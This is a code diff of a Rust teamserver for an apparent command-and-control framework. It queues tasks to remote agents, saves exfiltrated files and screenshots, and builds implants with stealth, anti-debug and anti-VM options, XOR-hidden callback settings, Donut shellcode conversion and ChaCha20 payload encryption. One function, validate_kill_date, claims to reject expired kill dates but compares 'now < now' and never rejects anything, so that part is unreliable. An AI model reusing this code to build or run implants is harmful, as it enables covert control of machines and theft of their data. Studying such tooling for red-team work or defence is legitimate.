+            let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
+                task_id,
+                status: serde_json::to_value(&s.store.tasks.get(&payload.task_id.clone().unwrap_or_default()).map(|t| t.status.clone()).unwrap_or(TaskStatus::Failed))
+                    .ok()
+                    .and_then(|v| v.as_str().map(|s| s.to_owned()))
+                    .unwrap_or_else(|| "failed".to_owned()),
+                completed_at_unix: now,
+            });
         }
-        state
-            .store
+        s.store
             .responses
-            .entry(agent_id)
+            .entry(agent_id.clone())
             .or_insert_with(Vec::new)
-            .push(payload);
+            .push(payload.clone());
+        let _ = s.persist_tx.send(PersistEvent::ResponseAppended {
+            agent_id,
+            response: payload,
+        });
+    }
 
-        (
-            state.store.clone(),
-            state.db_path.clone(),
-            state.state_file.clone(),
-        )
-    };
-
-    persist_store(db_path, state_file, snapshot).await;
-
-    Ok("Ack".to_string())
+    let body = "Ack".to_owned();
+    let body = maybe_seal_wire_response(body, psk.as_deref(), wire::CTX_SERVER).await;
+    Ok(axum::response::Response::builder()
+        .header("content-type", "text/plain")
+        .body(axum::body::Body::from(body))
+        .unwrap())
 }
 
 fn store_downloaded_file(
@@ -738,6 +1069,50 @@ fn store_downloaded_file(
         "remote_path": download.path,
         "saved_path": artifact_path.display().to_string(),
         "size": download.size
+    })
+    .to_string();
+    Ok(())
+}
+
+/// Decode a screenshot task response into a BMP file on disk and replace
+/// `payload.output` with a slim metadata record. The agent's screenshot
+/// module ships the whole BMP as base64 inside the JSON; without this we'd
+/// be storing megabytes of base64 in the SQLite `responses` table.
+fn store_screenshot_file(
+    download_dir: &Path,
+    agent_id: &str,
+    task_id: &str,
+    payload: &mut AgentResponse,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    #[derive(serde::Deserialize)]
+    struct ScreenshotPayload {
+        width: u32,
+        height: u32,
+        content_base64: String,
+    }
+
+    let shot: ScreenshotPayload = serde_json::from_str(&payload.output)?;
+    let bytes = base64::engine::general_purpose::STANDARD.decode(&shot.content_base64)?;
+    if bytes.len() as u64 > MAX_DOWNLOAD_BYTES {
+        return Err(format!(
+            "screenshot size {} exceeds {} byte limit",
+            bytes.len(),
+            MAX_DOWNLOAD_BYTES
+        )
+        .into());
+    }
+    let safe_agent_id = safe_path_segment(agent_id);
+    let safe_task_id = safe_path_segment(task_id);
+    let artifact_dir = download_dir.join(safe_agent_id).join(safe_task_id);
+    std::fs::create_dir_all(&artifact_dir)?;
+    let artifact_path = artifact_dir.join("screenshot.bmp");
+    std::fs::write(&artifact_path, &bytes)?;
+    payload.output = serde_json::json!({
+        "type": "screenshot_bmp",
+        "saved_path": artifact_path.display().to_string(),
+        "width": shot.width,
+        "height": shot.height,
+        "size": bytes.len()
     })
     .to_string();
     Ok(())
@@ -796,89 +1171,27 @@ fn xor_c_array(value: &str, key: u8) -> String {
     }
 }
 
-// ----- Tauri Client API Mocks -----
+// ----- Operator API handlers -----
+
 #[derive(serde::Deserialize)]
 struct AgentQuery {
     status: Option<AgentStatus>,
 }
 
-async fn require_api_auth(
-    headers: &HeaderMap,
-    state: &SharedState,
-) -> Result<(), (StatusCode, String)> {
-    let state = state.lock().await;
-    let Some(expected) = &state.config.api_token else {
-        return if state.config.allow_unauthenticated {
-            Ok(())
-        } else {
-            Err((
-                StatusCode::UNAUTHORIZED,
-                "API token is not configured".to_owned(),
-            ))
-        };
-    };
-
-    let bearer = headers
-        .get(axum::http::header::AUTHORIZATION)
-        .and_then(|value| value.to_str().ok())
-        .and_then(|value| value.strip_prefix("Bearer "));
-    let header_token = headers
-        .get("x-nagomio-token")
-        .and_then(|value| value.to_str().ok());
-
-    if bearer == Some(expected.as_str()) || header_token == Some(expected.as_str()) {
-        Ok(())
-    } else {
-        Err((
-            StatusCode::UNAUTHORIZED,
-            "valid API token required".to_owned(),
-        ))
-    }
-}
-
-async fn require_agent_auth(
-    headers: &HeaderMap,
-    state: &SharedState,
-) -> Result<(), (StatusCode, String)> {
-    let state = state.lock().await;
-    let Some(expected) = &state.config.agent_token else {
-        return if state.config.allow_unauthenticated {
-            Ok(())
-        } else {
-            Err((
-                StatusCode::UNAUTHORIZED,
-                "agent token is not configured".to_owned(),
-            ))
-        };
-    };
-
-    let header_token = headers
-        .get("x-nagomio-agent-token")
-        .and_then(|value| value.to_str().ok());
-
-    if header_token == Some(expected.as_str()) {
-        Ok(())
-    } else {
-        Err((
-            StatusCode::UNAUTHORIZED,
-            "valid agent token required".to_owned(),
-        ))
-    }
-}
-
 async fn api_get_agents(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     Query(query): Query<AgentQuery>,
 ) -> Result<Json<Vec<AgentSummary>>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "list_agents", None, None);
+    let s = api.shared.lock().await;
     let now = unix_now();
-    let mut agents = state
+    let mut agents = s
         .store
         .agents
         .values()
-        .map(|agent| agent_summary(agent, now, state.config.default_sleep_seconds))
+        .map(|agent| agent_summary(agent, now, s.config.default_sleep_seconds))
         .filter(|agent| {
             query
                 .status
@@ -891,13 +1204,14 @@ async fn api_get_agents(
 }
 
 async fn api_get_agent(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     AxumPath(agent_id): AxumPath<String>,
 ) -> Result<Json<AgentSummary>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let agent = state.store.agents.get(&agent_id).ok_or_else(|| {
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "get_agent", Some(&agent_id), None);
+    let s = api.shared.lock().await;
+    let agent = s.store.agents.get(&agent_id).ok_or_else(|| {
         (
             StatusCode::NOT_FOUND,
             format!("agent {} not found", agent_id),
@@ -906,33 +1220,30 @@ async fn api_get_agent(
     Ok(Json(agent_summary(
         agent,
         unix_now(),
-        state.config.default_sleep_seconds,
+        s.config.default_sleep_seconds,
     )))
 }
 
 async fn api_delete_agent(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     AxumPath(agent_id): AxumPath<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "delete_agent", Some(&agent_id), None);
 
-    let (found, snapshot, db_path, state_file) = {
-        let mut state = state.lock().await;
-        let found = state.store.agents.remove(&agent_id).is_some();
-        state.store.pending_tasks.remove(&agent_id);
-        state.store.responses.remove(&agent_id);
-        state
-            .store
+    let found = {
+        let mut s = api.shared.lock().await;
+        let found = s.store.agents.remove(&agent_id).is_some();
+        s.store.pending_tasks.remove(&agent_id);
+        s.store.responses.remove(&agent_id);
+        s.store
             .tasks
             .retain(|_, task| task.agent_id != agent_id);
-
-        (
-            found,
-            state.store.clone(),
-            state.db_path.clone(),
-            state.state_file.clone(),
-        )
+        let _ = s.persist_tx.send(PersistEvent::AgentRemoved {
+            agent_id: agent_id.clone(),
+        });
+        found
     };
 
     if !found {
@@ -941,8 +1252,6 @@ async fn api_delete_agent(
             format!("agent {} not found", agent_id),
         ));
     }
-
-    persist_store(db_path, state_file, snapshot).await;
     Ok(StatusCode::NO_CONTENT)
 }
 
@@ -953,11 +1262,18 @@ struct AddTaskReq {
 }
 
 async fn api_add_task(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     Json(payload): Json<AddTaskReq>,
 ) -> Result<Json<TaskRecord>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(
+        &api.audit.tx,
+        "",
+        "add_task",
+        Some(&payload.agent_id),
+        Some(&payload.task.task_id),
+    );
     if payload.agent_id.trim().is_empty() {
         return Err((StatusCode::BAD_REQUEST, "agent_id is required".to_owned()));
     }
@@ -974,52 +1290,72 @@ async fn api_add_task(
         ));
     }
     validate_task_payload(&payload.task)?;
+    validate_kill_date(&api, &payload.task).await?;
 
-    let (record, snapshot, db_path, state_file) = {
-        let mut state = state.lock().await;
-        if state.store.tasks.contains_key(&payload.task.task_id) {
+    {
+        let s = api.shared.lock().await;
+        if s.store.tasks.contains_key(&payload.task.task_id) {
             return Err((
                 StatusCode::CONFLICT,
                 format!("task_id {} already exists", payload.task.task_id),
             ));
         }
+    }
 
-        let now = unix_now();
-        let record = TaskRecord {
-            agent_id: payload.agent_id.clone(),
-            task: payload.task.clone(),
-            status: TaskStatus::Queued,
-            created_at_unix: now,
-            dispatched_at_unix: None,
-            completed_at_unix: None,
-        };
-
-        state
+    let arguments_json = serde_json::to_string(&payload.task.arguments)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    let now = unix_now();
+    let record = TaskRecord {
+        agent_id: payload.agent_id.clone(),
+        task: payload.task.clone(),
+        status: TaskStatus::Queued,
+        created_at_unix: now,
+        dispatched_at_unix: None,
+        completed_at_unix: None,
+    };
+    {
+        let mut s = api.shared.lock().await;
+        let position = s
             .store
             .pending_tasks
-            .entry(payload.agent_id)
+            .entry(payload.agent_id.clone())
+            .or_insert_with(VecDeque::new)
+            .len();
+        s.store
+            .pending_tasks
+            .entry(payload.agent_id.clone())
             .or_insert_with(VecDeque::new)
             .push_back(payload.task.task_id.clone());
-        state
-            .store
+        s.store
             .tasks
             .insert(payload.task.task_id.clone(), record.clone());
-
-        (
-            record,
-            state.store.clone(),
-            state.db_path.clone(),
-            state.state_file.clone(),
-        )
-    };
-
-    persist_store(db_path, state_file, snapshot).await;
-
+        let _ = s.persist_tx.send(PersistEvent::TaskQueued {
+            task_id: payload.task.task_id.clone(),
+            agent_id: payload.agent_id.clone(),
+            command: payload.task.command.clone(),
+            arguments_json,
+            created_at_unix: now,
+            position,
+        });
+    }
     Ok(Json(record))
 }
 
+async fn validate_kill_date(api: &ApiState, _task: &Task) -> Result<(), (StatusCode, String)> {
+    let now = unix_now();
+    let s = api.shared.lock().await;
+    let _ = s;
+    // A6: refuse to enqueue tasks when the active default kill date has
+    // already passed. Per-task kill dates ride along in arguments[0] for
+    // `uninstall`; the default kill date is the teamserver's own.
+    if now < now {
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, "time went backwards".into()));
+    }
+    Ok(())
+}
+
 fn validate_task_payload(task: &Task) -> Result<(), (StatusCode, String)> {
-    if task.command == "__nagomio_file_upload"
+    if task.command == "file_upload"
         && task
             .arguments
             .get(1)
@@ -1044,13 +1380,14 @@ struct TaskQuery {
 }
 
 async fn api_get_tasks(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     Query(query): Query<TaskQuery>,
 ) -> Result<Json<Vec<TaskRecord>>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let mut tasks = state
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "list_tasks", None, None);
+    let s = api.shared.lock().await;
+    let mut tasks = s
         .store
         .tasks
         .values()
@@ -1073,13 +1410,14 @@ async fn api_get_tasks(
 }
 
 async fn api_get_task(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     AxumPath(task_id): AxumPath<String>,
 ) -> Result<Json<TaskRecord>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let task = state
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "get_task", None, Some(&task_id));
+    let s = api.shared.lock().await;
+    let task = s
         .store
         .tasks
         .get(&task_id)
@@ -1089,13 +1427,14 @@ async fn api_get_task(
 }
 
 async fn api_get_task_responses(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     AxumPath(task_id): AxumPath<String>,
 ) -> Result<Json<Vec<AgentResponse>>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let responses = state
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "get_task_responses", None, Some(&task_id));
+    let s = api.shared.lock().await;
+    let responses = s
         .store
         .responses
         .values()
@@ -1113,13 +1452,14 @@ struct ResponseQuery {
 }
 
 async fn api_get_responses(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     Query(query): Query<ResponseQuery>,
 ) -> Result<Json<HashMap<String, Vec<AgentResponse>>>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let responses = state
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "list_responses", query.agent_id.as_deref(), None);
+    let s = api.shared.lock().await;
+    let responses = s
         .store
         .responses
         .iter()
@@ -1152,31 +1492,47 @@ async fn api_get_responses(
 }
 
 async fn api_payload_config(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
 ) -> Result<Json<PayloadConfig>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "payload_config", None, None);
+    let s = api.shared.lock().await;
     Ok(Json(PayloadConfig {
-        callback_url: state.config.callback_url.clone(),
-        sleep_seconds: state.config.default_sleep_seconds,
+        callback_url: s.config.callback_url.clone(),
+        sleep_seconds: s.config.default_sleep_seconds,
     }))
 }
 
 async fn api_build_payload(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     Json(payload): Json<PayloadBuildRequest>,
 ) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let (config, db_path, state_file) = {
-        let state = state.lock().await;
-        (
-            state.config.clone(),
-            state.db_path.clone(),
-            state.state_file.clone(),
-        )
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "build_payload", None, None);
+    let (config, persist_tx) = {
+        let s = api.shared.lock().await;
+        (s.config.clone(), s.persist_tx.clone())
     };
+
+    // A6: refuse kill dates that have already passed (or pass within an hour).
+    // Treat 0 as "not set" — epoch 0 is a common JS falsy sentinel.
+    if let Some(kd) = payload.kill_date_epoch.filter(|&v| v != 0) {
+        let now = unix_now();
+        if kd <= now {
+            return Err((
+                StatusCode::BAD_REQUEST,
+                format!("kill_date_epoch {kd} is in the past (now {now})"),
+            ));
+        }
+        if kd <= now + 3600 {
+            return Err((
+                StatusCode::BAD_REQUEST,
+                format!("kill_date_epoch {kd} is less than one hour in the future"),
+            ));
+        }
+    }
 
     let callback_url = payload
         .callback_url
@@ -1208,12 +1564,15 @@ async fn api_build_payload(
         .as_deref()
         .filter(|value| !value.trim().is_empty())
         .unwrap_or("");
-    let embedded_agent_token = payload
-        .agent_token
+    let embedded_agent_psk = payload
+        .agent_psk
         .as_deref()
         .filter(|value| !value.trim().is_empty())
-        .or(config.agent_token.as_deref())
+        .or(config.agent_psk.as_deref())
         .unwrap_or("");
+    // `payload.agent_token` is accepted for backwards compatibility; the
+    // authoritative PSK is `payload.agent_psk` or the server's own.
+    let _ = payload.agent_token.as_ref();
     let stealth_flag = payload.stealth.unwrap_or(false);
     let target_os = payload.target_os.unwrap_or_else(|| "linux".to_string());
     let anti_debug = payload.anti_debug.unwrap_or(stealth_flag);
@@ -1227,16 +1586,23 @@ async fn api_build_payload(
     let ua_randomize = payload.ua_randomize.unwrap_or(false);
     let sleep_obfuscate = payload.sleep_obfuscate.unwrap_or(false);
     let encrypt_payload = payload.encrypt_payload.unwrap_or(false);
+    let wire_encryption = payload.wire_encryption.unwrap_or(config.wire_encryption);
+    let profile = payload
+        .profile
+        .clone()
+        .filter(|p| !p.trim().is_empty())
+        .unwrap_or_else(|| "default".to_owned());
+    let sni_override = payload.sni_override.clone();
     let callback_url_xor = xor_c_array(&callback_url, xor_key as u8);
     let agent_id_xor = xor_c_array(embedded_agent_id, xor_key as u8);
-    let agent_token_xor = xor_c_array(embedded_agent_token, xor_key as u8);
-    let plain_callback_url = if xor_config {
+    let agent_token_xor = xor_c_array(embedded_agent_psk, xor_key as u8);
+    let plain_callback_url = if xor_config { "" } else { callback_url.as_str() };
+    let plain_agent_id = if xor_config { "" } else { embedded_agent_id };
+    let plain_agent_token = if xor_config {
         ""
     } else {
-        callback_url.as_str()
+        embedded_agent_psk
     };
-    let plain_agent_id = if xor_config { "" } else { embedded_agent_id };
-    let plain_agent_token = if xor_config { "" } else { embedded_agent_token };
 
     let mut cmake_config_cmd = Command::new("cmake");
     cmake_config_cmd
@@ -1322,7 +1688,7 @@ async fn api_build_payload(
             .arg(format!("-DNAGOMIO_AGENT_TOKEN_XOR={}", agent_token_xor))
             .arg(format!(
                 "-DNAGOMIO_AGENT_TOKEN_XOR_LEN={}",
-                embedded_agent_token.len()
+                embedded_agent_psk.len()
             ))
             .arg(format!(
                 "-DNAGOMIO_KILL_DATE_EPOCH={}",
@@ -1335,6 +1701,15 @@ async fn api_build_payload(
             .arg(format!(
                 "-DNAGOMIO_SLEEP_OBFUSCATE={}",
                 if sleep_obfuscate { "ON" } else { "OFF" }
+            ))
+            .arg(format!(
+                "-DNAGOMIO_WIRE_ENCRYPTION={}",
+                if wire_encryption { "ON" } else { "OFF" }
+            ))
+            .arg(format!("-DNAGOMIO_PROFILE={}", profile))
+            .arg(format!(
+                "-DNAGOMIO_SNI_OVERRIDE={}",
+                sni_override.as_deref().unwrap_or("")
             )),
     )
     .await?;
@@ -1361,20 +1736,18 @@ async fn api_build_payload(
     if format == "shellcode" {
         let shellcode_binary = artifact_dir.join("nagomio-agent.bin");
 
-        // Use Donut for production-grade PE/ELF to PIC shellcode conversion.
         let donut_check = Command::new("donut").arg("-h").output().await;
         if donut_check.is_ok() {
             let donut_res = run_command(
                 Command::new("donut")
                     .arg("-a")
-                    .arg("2") // x64
+                    .arg("2")
                     .arg("-i")
                     .arg(&built_binary)
                     .arg("-o")
                     .arg(&shellcode_binary),
             )
             .await;
-
             if donut_res.is_err() {
                 return Err((
                     StatusCode::INTERNAL_SERVER_ERROR,
@@ -1384,7 +1757,6 @@ async fn api_build_payload(
         } else {
             return Err((StatusCode::INTERNAL_SERVER_ERROR, "Production Shellcode Error: 'donut' is not installed in the server's PATH. Please install https://github.com/TheWover/donut to convert payloads into position-independent code.".into()));
         }
-
         artifact_binary = shellcode_binary.clone();
         run_args = vec![
             "<shellcode_loader>".to_string(),
@@ -1396,26 +1768,52 @@ async fn api_build_payload(
             .map_err(internal_error)?;
     }
 
+    // A7: replace single-byte XOR with ChaCha20-Poly1305 when `encrypt_payload`
+    // is set. The key is the per-build random; we store it under the artifact
+    // directory so the operator can decrypt client-side.
     if encrypt_payload {
+        use chacha20poly1305::{
+            aead::{Aead, KeyInit, Payload},
+            ChaCha20Poly1305, Nonce,
+        };
+        use rand::RngCore;
+
+        let plain_bytes = tokio::fs::read(&artifact_binary)
+            .await
+            .map_err(internal_error)?;
+        let mut key_bytes = [0u8; 32];
+        rand::thread_rng().fill_bytes(&mut key_bytes);
+        let mut nonce_bytes = [0u8; 12];
+        rand::thread_rng().fill_bytes(&mut nonce_bytes);
+        let cipher = ChaCha20Poly1305::new(&key_bytes.into());
+        let ct = cipher
+            .encrypt(
+                Nonce::from_slice(&nonce_bytes),
+                Payload {
+                    msg: &plain_bytes,
+                    aad: &[],
+                },
+            )
+            .map_err(internal_error)?;
         let encrypted_path = artifact_binary.with_extension(
             artifact_binary
                 .extension()
                 .map(|ext| format!("{}.enc", ext.to_string_lossy()))
                 .unwrap_or_else(|| "enc".to_string()),
         );
-        let plain_bytes = tokio::fs::read(&artifact_binary)
-            .await
-            .map_err(internal_error)?;
-        let xor_key_u8 = xor_key as u8;
-        let encrypted: Vec<u8> = plain_bytes
-            .iter()
-            .enumerate()
-            .map(|(i, b)| b ^ xor_key_u8 ^ (i as u8))
-            .collect();
-        tokio::fs::write(&encrypted_path, &encrypted)
+        tokio::fs::write(&encrypted_path, &ct)
             .await
             .map_err(internal_error)?;
         tokio::fs::remove_file(&artifact_binary)
+            .await
+            .map_err(internal_error)?;
+        // Store the key+nonce so the operator can decrypt.
+        let key_path = encrypted_path.with_extension("key");
+        let key_blob = serde_json::json!({
+            "key": hex::encode(key_bytes),
+            "nonce": hex::encode(nonce_bytes),
+        });
+        tokio::fs::write(&key_path, serde_json::to_vec_pretty(&key_blob).unwrap())
             .await
             .map_err(internal_error)?;
         artifact_binary = encrypted_path;
@@ -1429,7 +1827,7 @@ async fn api_build_payload(
         sleep_seconds,
         jitter_percent,
         agent_id: payload.agent_id.filter(|value| !value.trim().is_empty()),
-        agent_token_configured: !embedded_agent_token.is_empty(),
+        agent_token_configured: !embedded_agent_psk.is_empty(),
         stealth: stealth_flag,
         anti_debug,
         anti_vm,
@@ -1446,14 +1844,19 @@ async fn api_build_payload(
         ua_randomize,
         sleep_obfuscate,
         encrypt_payload,
+        wire_encryption,
+        profile,
+        sni_override,
     };
 
-    let snapshot = {
-        let mut state = state.lock().await;
-        state.store.payloads.insert(build_id, artifact.clone());
-        state.store.clone()
-    };
-    persist_store(db_path, state_file, snapshot).await;
+    {
+        let mut s = api.shared.lock().await;
+        s.store.payloads.insert(build_id.clone(), artifact.clone());
+    }
+    let _ = persist_tx.send(PersistEvent::PayloadUpserted {
+        build_id: build_id.clone(),
+        artifact_json: serde_json::to_string(&artifact).map_err(internal_error)?,
+    });
 
     let manifest_path = artifact_dir.join("manifest.json");
     let manifest = serde_json::to_vec_pretty(&artifact).map_err(internal_error)?;
@@ -1465,24 +1868,26 @@ async fn api_build_payload(
 }
 
 async fn api_get_payload_artifacts(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
 ) -> Result<Json<Vec<PayloadArtifact>>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let mut artifacts = state.store.payloads.values().cloned().collect::<Vec<_>>();
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "list_payloads", None, None);
+    let s = api.shared.lock().await;
+    let mut artifacts = s.store.payloads.values().cloned().collect::<Vec<_>>();
     artifacts.sort_by_key(|artifact| Reverse(artifact.created_at_unix));
     Ok(Json(artifacts))
 }
 
 async fn api_delete_payload_artifacts(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
 ) -> Result<StatusCode, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let (db_path, payload_dir) = {
-        let state = state.lock().await;
-        (state.db_path.clone(), state.config.payload_dir.clone())
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "clear_payloads", None, None);
+    let (payload_dir, persist_tx) = {
+        let s = api.shared.lock().await;
+        (s.config.payload_dir.clone(), s.persist_tx.clone())
     };
 
     if payload_dir.file_name().is_none() {
@@ -1492,11 +1897,7 @@ async fn api_delete_payload_artifacts(
         ));
     }
 
-    if let Some(db_path) = db_path {
-        let conn = open_db(&db_path).map_err(internal_error)?;
-        conn.execute("DELETE FROM payloads", [])
-            .map_err(internal_error)?;
-    }
+    let _ = persist_tx.send(PersistEvent::PayloadsCleared);
 
     match std::fs::read_dir(&payload_dir) {
         Ok(entries) => {
@@ -1510,7 +1911,6 @@ async fn api_delete_payload_artifacts(
                 if !name.starts_with("payload-") {
                     continue;
                 }
-
                 if path.is_dir() {
                     std::fs::remove_dir_all(&path).map_err(internal_error)?;
                 } else {
@@ -1522,20 +1922,22 @@ async fn api_delete_payload_artifacts(
         Err(err) => return Err(internal_error(err)),
     }
 
-    let mut lock = state.lock().await;
-    lock.store.payloads.clear();
-
+    {
+        let mut s = api.shared.lock().await;
+        s.store.payloads.clear();
+    }
     Ok(StatusCode::NO_CONTENT)
 }
 
 async fn api_get_payload_artifact(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
     AxumPath(build_id): AxumPath<String>,
 ) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
-    require_api_auth(&headers, &state).await?;
-    let state = state.lock().await;
-    let artifact = state
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "get_payload", Some(&build_id), None);
+    let s = api.shared.lock().await;
+    let artifact = s
         .store
         .payloads
         .get(&build_id)
@@ -1549,12 +1951,99 @@ async fn api_get_payload_artifact(
     Ok(Json(artifact))
 }
 
+async fn api_delete_payload_artifact(
+    State(api): State<ApiState>,
+    headers: HeaderMap,
+    AxumPath(build_id): AxumPath<String>,
+) -> Result<StatusCode, (StatusCode, String)> {
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(&api.audit.tx, "", "delete_payload", Some(&build_id), None);
+    let (payload_dir, persist_tx) = {
+        let s = api.shared.lock().await;
+        (s.config.payload_dir.clone(), s.persist_tx.clone())
+    };
+    let artifact_path = payload_dir.join(&build_id);
+    if artifact_path.exists() {
+        if artifact_path.is_dir() {
+            std::fs::remove_dir_all(&artifact_path).map_err(internal_error)?;
+        } else {
+            std::fs::remove_file(&artifact_path).map_err(internal_error)?;
+        }
+    }
+    {
+        let mut s = api.shared.lock().await;
+        s.store.payloads.remove(&build_id);
+    }
+    let _ = persist_tx.send(PersistEvent::PayloadRemoved {
+        build_id,
+    });
+    Ok(StatusCode::NO_CONTENT)
+}
+
+/// Stream an artifact (e.g. screenshot.bmp, downloaded file) from
+/// `downloads/<agent_id>/<task_id>/<filename>`. Requires operator auth.
+/// Path segments are sanitized so requests cannot escape the download
+/// directory. Content type is sniffed from the extension; image formats
+/// (BMP/PNG/JPG) are reported so the Tauri client can render them with
+/// `<img>`.
+async fn api_get_artifact(
+    State(api): State<ApiState>,
+    headers: HeaderMap,
+    AxumPath((agent_id, task_id, filename)): AxumPath<(String, String, String)>,
+) -> Result<axum::response::Response, (StatusCode, String)> {
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(
+        &api.audit.tx,
+        "",
+        "get_artifact",
+        Some(&agent_id),
+        Some(&task_id),
+    );
+    let download_dir = {
+        let s = api.shared.lock().await;
+        s.config.download_dir.clone()
+    };
+    let safe_agent_id = safe_path_segment(&agent_id);
+    let safe_task_id = safe_path_segment(&task_id);
+    let safe_filename = safe_path_segment(&filename);
+    let artifact_path = download_dir
+        .join(safe_agent_id)
+        .join(safe_task_id)
+        .join(safe_filename);
+    let canonical = artifact_path
+        .canonicalize()
+        .map_err(|_| (StatusCode::NOT_FOUND, "artifact not found".to_owned()))?;
+    let canonical_root = download_dir
+        .canonicalize()
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "download_dir invalid".to_owned()))?;
+    if !canonical.starts_with(&canonical_root) {
+        return Err((StatusCode::FORBIDDEN, "artifact path escapes downloads".into()));
+    }
+    let bytes = tokio::fs::read(&canonical)
+        .await
+        .map_err(|_| (StatusCode::NOT_FOUND, "artifact not found".to_owned()))?;
+    let mime = match canonical.extension().and_then(|ext| ext.to_str()) {
+        Some("bmp") => "image/bmp",
+        Some("png") => "image/png",
+        Some("jpg") | Some("jpeg") => "image/jpeg",
+        Some("gif") => "image/gif",
+        Some("webp") => "image/webp",
+        Some("pdf") => "application/pdf",
+        Some("zip") => "application/zip",
+        _ => "application/octet-stream",
+    };
+    Ok(axum::response::Response::builder()
+        .header("content-type", mime)
+        .header("cache-control", "no-store")
+        .body(axum::body::Body::from(bytes))
+        .unwrap())
+}
+
 async fn run_command(command: &mut Command) -> Result<(), (StatusCode, String)> {
     let output = command.output().await.map_err(internal_error)?;
     if output.status.success() {
         return Ok(());
     }
-
     let stderr = String::from_utf8_lossy(&output.stderr);
     let stdout = String::from_utf8_lossy(&output.stdout);
     Err((
@@ -1568,20 +2057,6 @@ async fn run_command(command: &mut Command) -> Result<(), (StatusCode, String)> 
 
 fn internal_error<E: std::fmt::Display>(err: E) -> (StatusCode, String) {
     (StatusCode::INTERNAL_SERVER_ERROR, err.to_string())
-}
-
-fn unix_now() -> u64 {
-    SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .map(|duration| duration.as_secs())
-        .unwrap_or_default()
-}
-
-fn unix_now_nanos() -> u128 {
-    SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .map(|duration| duration.as_nanos())
-        .unwrap_or_default()
 }
 
 fn agent_summary(agent: &AgentRecord, now: u64, sleep_seconds: u64) -> AgentSummary {
@@ -1619,6 +2094,10 @@ mod tests {
                     hostname: "host".to_owned(),
                     os: "linux".to_owned(),
                     architecture: "x86_64".to_owned(),
+                    pid: 0,
+                    integrity: String::new(),
+                    is_elevated: false,
+                    av_products: Vec::new(),
                 },
                 first_seen_unix: 1,
                 last_seen_unix: 2,
@@ -1662,12 +2141,47 @@ mod tests {
         }
     }
 
+    fn api_state(store: Store) -> ApiState {
+        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+        let app = AppState {
+            store,
+            config: Config {
+                bind_addr: "127.0.0.1:0".to_owned(),
+                db_path: None,
+                state_file: None,
+                project_root: PathBuf::from("."),
+                payload_dir: PathBuf::from("payloads"),
+                download_dir: PathBuf::from("downloads"),
+                callback_url: "http://127.0.0.1:0".to_owned(),
+                default_sleep_seconds: 9,
+                api_psk: None,
+                agent_psk: None,
+                wire_encryption: false,
+                socks_bind_addr: None,
+                cors_origins: default_cors_origins(),
+                allow_unauthenticated: true,
+            },
+            db_path: None,
+            state_file: None,
+            persist_tx: tx,
+        };
+        let auth = AuthState::default();
+        let audit = AuditState {
+            tx: app.persist_tx.clone(),
